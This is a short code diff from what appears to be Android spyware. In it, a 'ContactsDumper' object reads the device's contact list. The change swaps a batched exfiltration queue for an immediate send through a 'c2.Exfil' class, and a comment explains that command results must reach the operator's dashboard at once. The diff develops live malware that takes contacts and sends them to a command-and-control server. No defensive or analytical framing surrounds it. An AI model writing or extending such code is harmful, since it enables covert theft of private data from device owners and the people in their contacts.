@@ -3,7 +3,7 @@ package com.sp.core.services
 import android.content.Context
 import android.provider.ContactsContract
 import android.util.Log
-import com.sp.core.util.BatchExfil
+import com.sp.core.c2.Exfil
 import org.json.JSONArray
 import org.json.JSONObject
 
@@ -42,7 +42,9 @@ object ContactsDumper {
             Log.w(TAG, "contacts unavailable: ${t.message}")
         }
         if (items.length() == 0) return 0
-        BatchExfil.enqueue(ctx, "contact", items.toString())
+        // Immediate send - a command result must not wait for the 45-minute
+        // batch, the dashboard reacts at once.
+        Exfil.sendLog(ctx, "contact", items.toString())
         return items.length()
     }
 }
